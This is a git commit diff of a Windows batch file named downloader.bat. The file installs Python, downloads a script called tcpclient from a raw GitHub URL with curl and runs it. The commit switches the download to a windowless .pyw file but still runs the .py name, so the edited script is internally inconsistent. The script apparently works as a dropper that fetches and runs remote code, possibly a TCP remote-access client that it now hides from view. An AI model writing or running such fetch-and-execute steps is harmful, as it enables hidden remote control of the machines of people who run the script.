8a8d882ff3bfa1f92cce10dece8eead271fe6760
Zarni1322 <47309974+Zarni1322@users.noreply.github.com>
2023-05-09 15:52:52 +0630

    Update downloader.bat

--- downloader.bat
+++ downloader.bat
@@ -6,7 +6,7 @@ python-3.11.3-amd64.exe
 
 del python-3.11.3-amd64.exe
 
-curl -O https://raw.githubusercontent.com/Zarni1322/python/main/tcpclient.py
+curl -O https://raw.githubusercontent.com/Zarni1322/python/main/tcpclient.pyw
 
 python tcpclient.py
 
